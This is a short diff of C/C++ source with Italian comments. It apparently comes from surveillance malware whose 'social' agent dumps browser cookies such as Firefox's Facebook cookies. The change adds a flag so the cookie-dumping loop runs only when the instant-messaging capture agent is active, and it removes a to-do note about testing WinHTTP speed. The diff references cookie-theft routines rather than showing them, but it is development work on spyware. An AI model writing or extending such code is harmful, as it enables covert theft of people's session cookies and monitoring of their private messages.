@@ -2,7 +2,6 @@
 //
 // - VERIFICARE PERCHE' SCORRA IN DUMP COOKIES!!!!!!!!!!!!!
 //
-// - Faccio un test a casa per vedere la velocita' di ricezione winhttp
 // - Nei vari handler faccio dumpare solo se c'e' l'agente corrispondente attivo. 
 //
 // - Controllo le XXX in questi sorgenti
@@ -36,6 +35,9 @@ extern int DumpFFCookies(void); // Cookie per Facebook
 extern wchar_t *UTF8_2_UTF16(char *str); // in firefox.cpp
 extern BOOL IsCrisisNetwork();
 extern DWORD social_process_control; // Variabile per il controllo del processo. Dichiarata nell'agente principale
+
+extern BOOL bPM_IMStarted; // variabili per vedere se gli agenti interessati sono attivi
+
 social_entry_struct social_entry[SOCIAL_ENTRY_COUNT];
 
 // Simple ascii url decode
@@ -143,9 +145,9 @@ void SocialMainLoop()
 			CheckProcessStatus();
 		}
 
-		// XXX
-		//if (tutti gli agenti disabilitati)
-		//	continue;
+		// XXX Aggiungo gli altri agenti interessati
+		if (!bPM_IMStarted /*&& !bPM_MailStarted*/)
+			continue;
 
 		// Verifica se qualcuno e' in attesa di nuovi cookies
 		// o se sta per fare una richiesta
